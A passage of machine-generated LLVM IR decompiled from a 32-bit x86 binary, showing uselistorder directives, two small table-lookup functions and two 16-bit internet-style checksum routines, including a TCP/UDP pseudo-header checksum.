  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 10, 6, 7, 11, 12, 13, 14, 15, 17, 16, 59, 18, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 19, 20, 21, 22, 23, 24, 45, 46, 47, 48, 51, 52, 53, 55, 56, 57, 58, 60, 62, 63, 64, 66, 67, 68, 69, 70, 71, 73, 72, 49, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 89, 87, 54, 50, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 223, 224, 225, 226, 125, 126, 127, 128, 129, 139, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 211, 213, 212, 207, 208, 209, 210, 214, 215, 216, 217, 218, 219, 220, 221, 222, 241, 242, 243, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 274, 275, 244, 245, 246, 247, 248, 249, 258, 259, 250, 251, 252, 253, 254, 255, 256, 257, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 287, 288, 276, 277, 278, 279, 282, 283, 280, 281, 65, 61, 284, 285, 286, 296, 289, 290, 291, 292, 293, 294, 295, 297, 298, 299 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 25, 24, 19, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 97, 98, 99, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 173, 174, 175, 176, 177, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 88, 85, 86, 87, 83, 89, 90, 91, 92, 93, 94, 95, 96, 149, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 161, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 170, 169, 23, 171, 172 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 17, 18, 7, 8, 9, 10, 11, 12, 15, 16, 19, 20, 21, 22, 13, 14, 23, 33, 24, 25, 26, 27, 28, 29, 35, 60, 61, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 121, 48, 49, 50, 51, 52, 53, 55, 56, 54, 57, 58, 59, 109, 110, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 438, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 67, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 501, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 497, 498, 499, 500, 502, 503, 504, 505, 506, 507, 512, 513, 508, 509, 510, 511, 514, 515, 516, 517, 518, 519, 520, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 237, 238, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 239, 240, 241, 242, 244, 245, 243, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 265, 266, 270, 271, 267, 268, 269, 263, 264, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 410, 411, 415, 412, 413, 414, 416, 417, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 458, 459, 460, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 433, 434, 431, 432, 435, 436, 437, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 486, 453, 454, 455, 456, 457, 487, 488, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 480, 481, 478, 479, 78, 76, 482, 483, 484, 485, 489, 490, 491, 492, 493, 494, 495, 496 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8054ab4.5 to i32), { 1, 0 }
  uselistorder i32 134564438, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_8051cf0(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804d4b0() local_unnamed_addr {
dec_label_pc_804d4b0:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804d4b7 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d4d5, label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d4b0, %dec_label_pc_804d4c0
  %v0_804d4ce = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4c0 ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4c3 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4c0 ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v0_804d4cb = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4c0 ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v1_804d4c0 = inttoptr i32 %v0_804d4cb to i16*
  %v2_804d4c0 = load i16, i16* %v1_804d4c0, align 2
  %v3_804d4c0 = zext i16 %v2_804d4c0 to i32
  %v1_804d4c3 = add i32 %v0_804d4c3, -2
  %v1_804d4cb = add i32 %v0_804d4cb, 2
  %v2_804d4ce = add i32 %v3_804d4c0, %v0_804d4ce
  %v5_804d4d0 = icmp eq i32 %v1_804d4c3, 0
  %v9_804d4d0 = icmp eq i32 %v0_804d4c3, 3
  %v2_804d4d3 = or i1 %v9_804d4d0, %v5_804d4d0
  br i1 %v2_804d4d3, label %dec_label_pc_804d4d5.loopexit, label %dec_label_pc_804d4c0

dec_label_pc_804d4d5.loopexit:                    ; preds = %dec_label_pc_804d4c0
  br label %dec_label_pc_804d4d5

dec_label_pc_804d4d5:                             ; preds = %dec_label_pc_804d4d5.loopexit, %dec_label_pc_804d4b0
  %v0_804d4db = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4d5.loopexit ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4d8 = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4d5.loopexit ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v0_804d4d5 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4d5.loopexit ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v8_804d4d5 = icmp eq i32 %v0_804d4d5, 1
  %v1_804d4d6 = icmp eq i1 %v8_804d4d5, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d4dd, label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d5
  %v1_804d4d8 = inttoptr i32 %v0_804d4d8 to i8*
  %v2_804d4d8 = load i8, i8* %v1_804d4d8, align 1
  %v3_804d4d8 = sext i8 %v2_804d4d8 to i32
  %v2_804d4db = add i32 %v3_804d4d8, %v0_804d4db
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d5, %dec_label_pc_804d4d8
  %v0_804d4dd = phi i32 [ %v0_804d4db, %dec_label_pc_804d4d5 ], [ %v2_804d4db, %dec_label_pc_804d4d8 ]
  %v1_804d4df = urem i32 %v0_804d4dd, 65536
  %v2_804d4e2 = udiv i32 %v0_804d4dd, 65536
  %v2_804d4e6 = add nuw nsw i32 %v1_804d4df, %v2_804d4e2
  %v2_804d4ea = udiv i32 %v2_804d4e6, 65536
  %v2_804d4ed = add nuw nsw i32 %v2_804d4ea, %v2_804d4e6
  %v1_804d4ef = urem i32 %v2_804d4ed, 65536
  %v1_804d4f2 = xor i32 %v1_804d4ef, 65535
  ret i32 %v1_804d4f2

; uselistorder directives
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v0_804d4db, { 1, 0 }
  uselistorder i32 %v1_804d4c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d4b7, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
}

define i32 @function_804d500() local_unnamed_addr {
dec_label_pc_804d500:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804d515 = ptrtoint i16* %tmp14 to i32
  %v1_804d51e = add i32 %tmp17, 12
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  %v3_804d51e = load i32, i32* %v2_804d51e, align 4
  %v1_804d521 = add i32 %tmp17, 16
  %v2_804d521 = inttoptr i32 %v1_804d521 to i32*
  %v3_804d521 = load i32, i32* %v2_804d521, align 4
  %v7_804d527 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804d527, label %dec_label_pc_804d530, label %dec_label_pc_804d545

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d530
  %v0_804d53e = phi i32 [ %v2_804d53e, %dec_label_pc_804d530 ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d533 = phi i32 [ %v1_804d533, %dec_label_pc_804d530 ], [ %tmp16, %dec_label_pc_804d500 ]
  %v0_804d53b = phi i32 [ %v1_804d53b, %dec_label_pc_804d530 ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v1_804d530 = inttoptr i32 %v0_804d53b to i16*
  %v2_804d530 = load i16, i16* %v1_804d530, align 2
  %v3_804d530 = zext i16 %v2_804d530 to i32
  %v1_804d533 = add i32 %v0_804d533, -2
  %v1_804d53b = add i32 %v0_804d53b, 2
  %v2_804d53e = add i32 %v3_804d530, %v0_804d53e
  %v1_804d540 = add i32 %v0_804d533, -3
  %v6_804d540 = sub i32 2, %v0_804d533
  %v7_804d540 = and i32 %v1_804d533, %v6_804d540
  %v8_804d540 = icmp slt i32 %v7_804d540, 0
  %v9_804d540 = icmp eq i32 %v1_804d540, 0
  %v10_804d540 = icmp slt i32 %v1_804d540, 0
  %v3_804d543 = icmp eq i1 %v10_804d540, %v8_804d540
  %v4_804d543 = icmp eq i1 %v9_804d540, false
  %v5_804d543 = and i1 %v4_804d543, %v3_804d543
  br i1 %v5_804d543, label %dec_label_pc_804d530, label %dec_label_pc_804d545.loopexit

dec_label_pc_804d545.loopexit:                    ; preds = %dec_label_pc_804d530
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.loopexit, %dec_label_pc_804d500
  %v0_804d5b0 = phi i32 [ %v2_804d53e, %dec_label_pc_804d545.loopexit ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d5ae = phi i32 [ %v1_804d53b, %dec_label_pc_804d545.loopexit ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v0_804d545 = phi i32 [ %v1_804d533, %dec_label_pc_804d545.loopexit ], [ %tmp16, %dec_label_pc_804d500 ]
  %v8_804d545 = icmp eq i32 %v0_804d545, 1
  br i1 %v8_804d545, label %dec_label_pc_804d5ac, label %dec_label_pc_804d548

dec_label_pc_804d548:                             ; preds = %dec_label_pc_804d545, %dec_label_pc_804d5ac
  %v0_804d556 = phi i32 [ %v0_804d5b0, %dec_label_pc_804d545 ], [ %v2_804d5b0, %dec_label_pc_804d5ac ]
  %v2_804d54c = udiv i32 %v3_804d521, 65536
  %v1_804d54f = add i32 %tmp17, 9
  %v2_804d54f = inttoptr i32 %v1_804d54f to i8*
  %v3_804d54f = load i8, i8* %v2_804d54f, align 1
  %v1_804d552 = zext i8 %v3_804d54f to i16
  %v2_804d552 = call i16 @llvm.bswap.i16(i16 %v1_804d552)
  %v3_804d552 = zext i16 %v2_804d552 to i32
  %v2_804d556 = add i32 %v0_804d556, %v2_804d54c
  %v2_804d55e = add i32 %v2_804d556, %v3_804d552
  %v1_804d564 = urem i32 %v3_804d51e, 65536
  %v2_804d56a = udiv i32 %v3_804d51e, 65536
  %v1_804d571 = urem i32 %v3_804d521, 65536
  %v4_804d579 = zext i16 %tmp15 to i32
  %v2_804d56d = add nuw nsw i32 %v2_804d56a, %v4_804d579
  %v2_804d577 = add nuw nsw i32 %v2_804d56d, %v1_804d564
  %v2_804d584 = add nuw nsw i32 %v2_804d577, %v1_804d571
  %v2_804d586 = add i32 %v2_804d584, %v2_804d55e
  %tmp = icmp ult i32 %v2_804d586, 65536
  br i1 %tmp, label %dec_label_pc_804d59e, label %dec_label_pc_804d590

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d548, %dec_label_pc_804d590
  %v2_804d5953 = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994.in = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994 = udiv i32 %v2_804d5994.in, 65536
  %v1_804d590 = urem i32 %v2_804d5953, 65536
  %v2_804d595 = add nuw nsw i32 %v1_804d590, %v2_804d5994
  %tmp25 = icmp ult i32 %v2_804d595, 65536
  %v1_804d59c = icmp eq i1 %tmp25, false
  br i1 %v1_804d59c, label %dec_label_pc_804d590, label %dec_label_pc_804d59e.loopexit

dec_label_pc_804d59e.loopexit:                    ; preds = %dec_label_pc_804d590
  br label %dec_label_pc_804d59e

dec_label_pc_804d59e:                             ; preds = %dec_label_pc_804d59e.loopexit, %dec_label_pc_804d548
